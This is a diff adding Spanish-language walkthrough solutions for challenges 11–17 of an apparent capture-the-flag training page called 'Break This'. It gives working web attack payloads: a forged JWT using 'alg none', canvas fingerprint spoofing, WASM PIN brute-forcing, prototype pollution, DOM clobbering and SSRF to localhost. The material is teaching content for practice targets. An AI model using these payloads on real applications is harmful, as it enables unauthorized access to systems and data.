@@ -342,6 +342,180 @@ footer{text-align:center;color:#333;font-size:0.8rem;margin-top:40px;font-family
     </div>
   </div>
 
+  <!-- RETO 11 -->
+  <div class="challenge" id="c11">
+    <div class="challenge-header" onclick="toggle('c11')">
+      <span class="num">11</span>
+      <span class="title">Firma Vacía</span>
+      <span class="tag api">API NIVEL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>El backend valida el token JWT. Si cambias el algoritmo a "none", el servidor aceptará el token sin firma.</p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>Abre la consola y crea un nuevo token JWT malicioso:</p>
+<pre><span class="keyword">let</span> h = <span class="fn">btoa</span>(<span class="keyword">JSON</span>.<span class="fn">stringify</span>({alg:<span class="string">"none"</span>}));
+<span class="keyword">let</span> p = <span class="fn">btoa</span>(<span class="keyword">JSON</span>.<span class="fn">stringify</span>({role:<span class="string">"admin"</span>}));
+<span class="keyword">window</span>.<span class="fn">sessionToken</span> = <span class="string">`${h}.${p}.`</span>;
+<span class="fn">checkAccess</span>();</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- RETO 12 -->
+  <div class="challenge" id="c12">
+    <div class="challenge-header" onclick="toggle('c12')">
+      <span class="num">12</span>
+      <span class="title">Falsificación de Lienzo</span>
+      <span class="tag local">LOCAL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>El sistema confía en la API nativa de Canvas para obtener la huella digital. Puedes interceptar y falsificar lo que devuelve.</p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>Sobrescribe el método <code>toDataURL</code> en la consola:</p>
+<pre><span class="keyword">HTMLCanvasElement</span>.<span class="fn">prototype</span>.<span class="fn">toDataURL</span> = <span class="keyword">function</span>() {
+  <span class="keyword">return</span> <span class="string">"data:image/png;base64,ADMIN_FINGERPRINT_X99"</span>;
+};</pre>
+        <p>Luego haz clic en "Verificar Huella".</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- RETO 13 -->
+  <div class="challenge" id="c13">
+    <div class="challenge-header" onclick="toggle('c13')">
+      <span class="num">13</span>
+      <span class="title">Caja Negra WASM</span>
+      <span class="tag local">LOCAL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>La validación se encuentra en un módulo WebAssembly precompilado que verifica el PIN correcto. Usa la consola para hacer fuerza bruta llamando a su función exportada.</p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>Ejecuta este código para encontrar el PIN:</p>
+<pre><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="val">0</span>; i < <span class="val">10000</span>; i++) {
+  <span class="keyword">if</span> (<span class="keyword">window</span>.<span class="fn">wasmModule</span>.<span class="fn">check_pin</span>(i) === <span class="val">1</span>) {
+    <span class="fn">console.log</span>(<span class="string">"El PIN es:"</span>, i); <span class="comment">// 8492</span>
+  }
+}</pre>
+        <p>Introduce <code>8492</code> en el input y pulsa VERIFICAR.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- RETO 14 -->
+  <div class="challenge" id="c14">
+    <div class="challenge-header" onclick="toggle('c14')">
+      <span class="num">14</span>
+      <span class="title">Contaminación Cruzada</span>
+      <span class="tag local">LOCAL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>La función <code>merge()</code> es insegura. Si pasas un objeto <code>__proto__</code>, puedes alterar las propiedades de todos los objetos en JavaScript (Contaminación de Prototipos).</p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>1. Añade esto al final de la URL en la barra de direcciones de tu navegador:</p>
+<pre><span class="string">#{"__proto__":{"isAdmin":true}}</span></pre>
+        <p>2. Recarga la página pulsando <strong>F5</strong>.</p>
+        <p>3. Haz clic en "Acceder a la Bóveda".</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- RETO 15 -->
+  <div class="challenge" id="c15">
+    <div class="challenge-header" onclick="toggle('c15')">
+      <span class="num">15</span>
+      <span class="title">Aplastamiento DOM</span>
+      <span class="tag local">LOCAL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>Si no se declara una variable, JS usa los IDs de HTML. Creando elementos anidados puedes construir la estructura que el script espera: <code>window.GlobalSecurityPolicy.isBypassed.value</code></p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>1. Abre el panel de <strong>Elements</strong> (F12).</p>
+        <p>2. Haz clic derecho sobre <code>&lt;div id="injection-zone"&gt;</code> y selecciona "Edit as HTML".</p>
+        <p>3. Pega este código dentro del div:</p>
+<pre>&lt;<span class="keyword">form</span> <span class="fn">id</span>=<span class="string">"GlobalSecurityPolicy"</span>&gt;
+  &lt;<span class="keyword">input</span> <span class="fn">id</span>=<span class="string">"isBypassed"</span> <span class="fn">value</span>=<span class="string">"true"</span>&gt;
+&lt;/<span class="keyword">form</span>&gt;</pre>
+        <p>4. Haz clic en "Validar Política".</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- RETO 16 -->
+  <div class="challenge" id="c16">
+    <div class="challenge-header" onclick="toggle('c16')">
+      <span class="num">16</span>
+      <span class="title">Ataque de Tiempo</span>
+      <span class="tag local">LOCAL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>La validación asíncrona te permite saber si un dígito es correcto midiendo cuánto tarda la respuesta. Alternativamente, la función global <code>verify()</code> te permite fuerza bruta asíncrona (o simplemente puedes espiar el código JavaScript).</p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>Usa el teclado en pantalla para introducir el PIN que se encuentra expuesto en la variable <code>_s</code>:</p>
+<pre><span class="string">8156</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- RETO 17 -->
+  <div class="challenge" id="c17">
+    <div class="challenge-header" onclick="toggle('c17')">
+      <span class="num">17</span>
+      <span class="title">Proxy Ciego (SSRF)</span>
+      <span class="tag api">API NIVEL</span>
+      <div class="diff"><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span><span class="on"></span></div>
+      <span class="arrow">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="step">
+        <div class="step-label">Concepto</div>
+        <p>El servicio proxy en el servidor acepta URLs y las solicita por ti. Puedes engañarlo pasándole la dirección de su red local (Server-Side Request Forgery).</p>
+      </div>
+      <div class="step">
+        <div class="step-label">Solución</div>
+        <p>1. Borra la URL de ejemplo.</p>
+        <p>2. Escribe una dirección de localhost que apunte a la ruta secreta:</p>
+<pre><span class="string">http://127.0.0.1/admin/secret</span></pre>
+        <p>3. Haz clic en "PROBAR URL".</p>
+      </div>
+    </div>
+  </div>
+
 </div>
 
 <footer>Break This — Soluciones v1.0</footer>
